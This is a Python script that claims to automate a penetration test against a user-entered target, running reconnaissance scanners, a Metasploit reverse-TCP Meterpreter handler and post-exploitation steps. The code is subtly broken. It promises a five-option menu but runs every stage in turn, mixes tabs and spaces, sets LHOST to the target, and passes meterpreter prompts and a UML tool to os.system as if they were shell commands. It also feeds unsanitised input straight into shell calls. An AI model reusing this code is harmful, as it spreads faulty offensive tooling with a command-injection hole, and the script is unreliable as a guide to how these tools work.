#write a python wrapper which can have 5 options to choose from as below:
#1. Information gathering
#2. Scanning and Enumeration
#3. Exploitation and techniques 
#4. Post-exploitation 
#5. Report generation

#This program prompts the user to enter the target system or network, and then performs the various tasks described in the outline, such as gathering information, scanning and enumerating, exploiting vulnerabilities, and performing post-exploitation actions. Finally, it generates a report detailing the information gathered and the steps taken during the penetration test.

import os

def gather_info(target):
    """
    Gathers information about the target system or network.
    """
    print("[*] Gathering information about the target...")
    os.system("theHarvester -d {} -b all".format(target))
    os.system("nmap -sV {}".format(target))

def scan_and_enum(target):
    """
    Scans and enumerates information about the target system or network.
    """
    print("[*] Scanning and enumerating the target...")
    os.system("nmap -sV -p- {}".format(target))
    os.system("enum4linux {}".format(target))
    os.system("nikto -h {}".format(target))

def exploit(target):
    """
    Attempts to exploit vulnerabilities in the target system or network.
    """
    print("[*] Attempting to exploit vulnerabilities in the target...")
    os.system("msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {}; exploit'".format(target))

def post_exploit(target):
    """
    Performs post-exploitation actions on the target system or network.
    """
    print("[*] Performing post-exploitation actions on the target...")
    os.system("meterpreter > sysinfo")
    os.system("meterpreter > shell")
    os.system("pivoting > run")

def generate_report(target):
    """
    Generates a report detailing the information gathered and steps taken during the penetration test.
    """
    print("[*] Generating report for the penetration test...")
    os.system("dradis -t {}".format(target))
    os.system("magicdraw -t {}".format(target))

def main():
    target = input("Enter the target system or network: ")
    gather_info(target)
    scan_and_enum(target)
	exploit(target)
	post_exploit(target)
	generate_report(target)

if __name__ == "__main__":
    main()

   
